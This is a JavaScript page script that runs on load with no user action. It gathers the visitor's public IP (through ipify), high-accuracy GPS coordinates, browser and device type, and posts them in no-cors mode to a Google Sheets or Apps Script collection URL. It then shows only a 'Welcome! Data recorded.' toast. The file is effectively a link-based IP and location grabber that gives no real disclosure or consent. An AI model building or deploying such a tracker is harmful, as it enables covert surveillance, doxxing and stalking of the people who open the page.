// ============================================================
// CONFIGURATION - Your Google Apps Script Web App URL
// (You still need to deploy the Apps Script and paste URL here)
// ============================================================
const GOOGLE_SCRIPT_URL = "https://docs.google.com/spreadsheets/d/1x8L7h8zBHSqCRN5MJemPh3qkgo7nlhqgVueknAMiFmE/edit?usp=sharing";

// ============================================================
// DOM Elements
// ============================================================
const loader = document.getElementById("loader");
const toast = document.getElementById("toast");
const mapSection = document.getElementById("map-section");
const mapFrame = document.getElementById("mapFrame");

// ============================================================
// Utility: Show toast notification
// ============================================================
function showToast(message, type = "success") {
    toast.textContent = message;
    toast.className = `toast ${type}`;
    setTimeout(() => toast.classList.add("hidden"), 4000);
}

// ============================================================
// Utility: Hide loader
// ============================================================
function hideLoader() {
    loader.classList.add("hidden");
}

// ============================================================
// Detect browser name
// ============================================================
function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
}

// ============================================================
// Detect device type
// ============================================================
function getDevice() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

// ============================================================
// Fetch user's public IP address
// ============================================================
async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return "Unavailable";
    }
}

// ============================================================
// Get user's geolocation
// ============================================================
function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

// ============================================================
// Show location on embedded map
// ============================================================
function showMap(lat, lng) {
    mapSection.style.display = "block";
    mapFrame.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
}

// ============================================================
// AUTO COLLECT & SEND - runs immediately on page load
// ============================================================
async function collectAndSend() {
    const [ip, location] = await Promise.all([getIP(), getLocation()]);

    const lat = location ? location.lat : "Denied";
    const lng = location ? location.lng : "Denied";
    const mapLink = location
        ? `https://www.google.com/maps?q=${lat},${lng}`
        : "Location denied";

    if (location) showMap(lat, lng);

    const payload = {
        timestamp: new Date().toLocaleString(),
        latitude: lat,
        longitude: lng,
        mapLink: mapLink,
        ip: ip,
        browser: getBrowser(),
        device: getDevice(),
        status: location ? "Location Granted" : "Location Denied"
    };

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        showToast("✅ Welcome! Data recorded.", "success");
    } catch (err) {
        showToast("❌ Connection error.", "error");
    }

    hideLoader();
}

// Auto-run immediately - no button click needed
collectAndSend();
